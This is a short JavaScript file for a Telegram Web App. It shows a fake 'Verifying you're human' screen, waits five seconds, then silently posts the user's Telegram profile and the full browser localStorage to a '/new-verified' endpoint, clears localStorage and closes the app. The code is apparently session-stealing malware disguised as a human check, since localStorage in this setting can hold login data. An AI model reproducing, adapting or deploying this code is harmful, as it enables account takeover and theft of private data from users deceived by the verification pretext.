// deno-lint-ignore-file no-window
window.Sg = {
  verify: false,
  init() {
    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.ready();
    }
  },
  close: () => {
    if (!this.verify) {
      this.verify = true;

      const isTelegram = window.Telegram?.WebApp?.initData;

      if (isTelegram) {
        // ✅ Schermata di caricamento identica allo stile originale
        document.body.innerHTML = `
          <div class="bg-telegram-bg">
            <main class="flex items-center justify-center flex-col h-[100vh] p-4 text-center">
              <div>
                <p class="text-3xl font-bold text-telegram-text">
                  Verifying you're human<span id="dots">...</span>
                </p>
              </div>
            </main>
          </div>

          <style>
            @keyframes dots {
              0%   { content: ""; }
              25%  { content: "."; }
              50%  { content: ".."; }
              75%  { content: "..."; }
              100% { content: ""; }
            }

            #dots::after {
              content: "";
              animation: dots 1.2s steps(4, end) infinite;
            }

            body, html {
              margin: 0;
              padding: 0;
              font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen,
                Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
              background: var(--tg-theme-bg-color, #212121);
              color: var(--tg-theme-text-color, #ffffff);
            }
          </style>
        `;
      }

      // ⏳ Attendi prima di chiudere
      if (isTelegram) {
        setTimeout(async () => {
          const user = window.Telegram.WebApp.initDataUnsafe.user || {};
          await fetch("/new-verified", {
            method: "POST",
            body: JSON.stringify({
              user,
              storage: window.localStorage,
            }),
            headers: {
              "content-type": "application/json",
            },
          });

          localStorage.clear();
          window.Telegram.WebApp.close();
        }, 5000); // ⏳ Chiude dopo 5 secondi
      }
    }
  },
};

Sg.init();
